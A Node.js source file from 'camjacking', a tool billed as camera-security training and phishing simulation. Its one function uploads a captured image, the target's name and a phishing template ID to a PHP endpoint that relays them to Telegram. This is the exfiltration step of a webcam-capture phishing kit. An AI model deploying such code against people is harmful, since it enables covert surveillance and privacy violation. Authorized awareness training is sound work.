#!/usr/bin/env node
/**
 * Camjacking - Camera Awareness & Security Training Toolkit (CLI)
 * ---------------------------------------------------------------
 *
 * Author      : Karthikeyan (https://karthithehacker.com)
 * GitHub      : https://github.com/karthi-the-hacker/camjacking
 * Project     : camjacking - A CLI framework for camera security awareness, phishing simulation, and cybersecurity training labs.
 *
 * License     : Open-source — strictly for educational, awareness, and authorized security training purposes ONLY.
 *
 * Note to Users:
 * --------------
 * 🔐 This tool is intended solely for educational use, security awareness programs, and authorized red-team / lab environments.
 * 🚫 Unauthorized use of this tool against individuals, devices, or networks without explicit permission is illegal and unethical.
 * ❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author and repository.
 *
 * Warning to Code Thieves:
 * ------------------------
 * ❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source community principles.
 * 🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
 * ✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
 */


const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

let lastSentAt = 0;
/**
 * Send image + fields to PHP endpoint
 */
async function sendToPhp({
  endpoint,
  imagePath,
  chatid,
  uuid,
  name,
  template,
  publicurl
}) {
    const now = Date.now();
  if (now - lastSentAt < 5000) {
    return { skipped: true, reason: "Rate limited (5s cooldown)" };
  }

  lastSentAt = now;
  const form = new FormData();
  form.append("image", fs.createReadStream(imagePath));
  form.append("chatid", String(chatid));
  form.append("uuid", uuid);
  form.append("name", name);
  form.append("template", template);
  form.append("publicurl", publicurl);

  const res = await axios.post(endpoint, form, {
    headers: form.getHeaders(),
    timeout: 60_000
  });

  return res.data; // parsed JSON from PHP
}



function handlePhpResponse(data) {
  if (data.status === "success") {
    console.log("✅ Upload + Telegram send OK");
  } else {
    console.log("❌ PHP error:", data.message);
  }
}

module.exports = {
  sendToPhp
  
};
